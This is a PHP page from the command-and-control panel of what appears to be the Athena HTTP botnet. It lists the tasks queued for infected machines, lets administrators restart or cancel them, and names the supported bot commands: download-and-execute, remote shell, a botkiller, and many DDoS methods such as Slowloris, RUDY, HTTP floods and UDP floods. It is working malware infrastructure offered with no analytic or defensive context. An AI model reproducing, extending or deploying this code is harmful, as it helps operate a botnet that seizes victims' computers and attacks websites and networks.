<?php

	if(!defined('AthenaHTTP')) header('Location: ..');

	$STATUS_NOTE = false;

	if($_GET['t'] && $_GET['a'] && $USERINFO['admin'])
	{
		$TASKID = trim($_GET['t']);
		$ACTION = trim($_GET['a']);
	
		if($ACTION == 'r')
		{
			mysql_query('DELETE FROM tasks_done WHERE taskid = \'' . mysql_real_escape_string($TASKID) . '\';');
			
			$STATUS_MESSAGE = 'Command restarted.';
			$STATUS_NOTE = true;
		}
		else if($ACTION == 'c')
		{
			mysql_query('DELETE FROM tasks WHERE id = \'' . mysql_real_escape_string($TASKID) . '\';');
			mysql_query('DELETE FROM tasks_done WHERE taskid = \'' . mysql_real_escape_string($TASKID) . '\';');
			
			$STATUS_MESSAGE = 'Command canceled.';
			$STATUS_NOTE = true;
		}
	}
	
	if($_GET['all'] && $USERINFO['admin'])
	{
		if($_GET['all'] == 'c')
		{
			mysql_query('DELETE FROM tasks_done WHERE 1;');
			mysql_query('DELETE FROM tasks WHERE 1;');
			
			$STATUS_MESSAGE = 'All commands cleared.';
			$STATUS_NOTE = true;
		}
		else if($_GET['all'] == 'r')
		{
			mysql_query('DELETE FROM tasks_done WHERE 1;');
			
			$STATUS_MESSAGE = 'All commands restarted.';
			$STATUS_NOTE = true;
		}
	}
	
	$result = mysql_query('SELECT id, username, task, parameter, `limit` FROM tasks WHERE 1;');
	while($row = mysql_fetch_array($result))
	{
		if(htmlentities($row['username']) == $USERINFO['username'] || $USERINFO['admin'])
		{
			$count = mysql_num_rows(mysql_query('SELECT id FROM tasks_done WHERE taskid = \'' . mysql_real_escape_string($row['id']) . '\';'));
	
			$PAGE_INCLUDE_TASKLIST .= '					<tr>' . "\n";
			$PAGE_INCLUDE_TASKLIST .= '						<td>' . htmlentities($row['id']) . '</td>' . "\n";
			$PAGE_INCLUDE_TASKLIST .= '						<td>' . htmlentities($row['username']) . '</td>' . "\n";
			$PAGE_INCLUDE_TASKLIST .= '						<td>' . getNameFromCommand(trim($row['task'])) . '</td>' . "\n";
			$PAGE_INCLUDE_TASKLIST .= '						<td>' . htmlentities($row['parameter']) . '</td>' . "\n";
			$PAGE_INCLUDE_TASKLIST .= '						<td>' . $count . ($row['limit'] == '0' ? '' : '/' . htmlentities($row['limit'])) . '</td>' . "\n";
		
			if($USERINFO['admin'])
			{
				$PAGE_INCLUDE_TASKLIST .= '						<td><input onClick="navigateTo(\'./index.php?p=tasks&t=' . htmlentities($row['id']) . '&a=r\');" type="button" class="paginate" value="Restart" /> <input onClick="navigateTo(\'./index.php?p=tasks&t=' . htmlentities($row['id']) . '&a=c\');" type="button" class="paginate" value="Delete" /></td>' . "\n";
			}
		
			$PAGE_INCLUDE_TASKLIST .= '					</tr>' . "\n";
		}
	}
	
	function getNameFromCommand($command)
	{
		switch($command)
		{
			case '!download': 				return 'Download & Execute';
			case '!download.arguments': 	return 'Download & Execute (with arguments)';
			case '!download.update': 		return 'Update';
			case '!view': 					return 'View';
			case '!view.hidden': 			return 'View Hidden';
			case '!smartview.add': 			return 'Add to SmartView';
			case '!smartview.del': 			return 'Remove from SmartView';
			case '!smartview.clear': 		return 'Clear SmartView';
			case '!botkill.start': 			return 'Start Botkiller';
			case '!botkill.stop': 			return 'Stop Botkiller';
			case '!botkill.once': 			return 'One Botkill Cycle';
			case '!shell': 					return 'Shell';
			case '!uninstall': 				return 'Uninstall';
			case '!ddos.http.arme': 		return 'ARME';
			case '!ddos.http.bandwidth':	return 'Bandwidth';
			case '!ddos.http.rapidget': 	return 'Rapid GET';
			case '!ddos.http.rapidpost':	return 'Rapid POST';
			case '!ddos.http.rudy': 		return 'RUDY';
			case '!ddos.http.slowloris':	return 'Slowloris';
			case '!ddos.http.slowpost': 	return 'Slow POST';
			case '!ddos.layer4.ecf': 		return 'ECF';
			case '!ddos.layer4.udp': 		return 'UDP';
			case '!ddos.browser': 			return 'Browser Based Attack';
			case '!ddos.browser.stop': 		return 'Stop Browser Based Attacks';
			case '!ddos.stop': 				return 'Stop Layer4/7 Attacks';	
			case '!http.status':			return 'Website Checker';	
			default: return htmlentities($command);
		}
	}
?>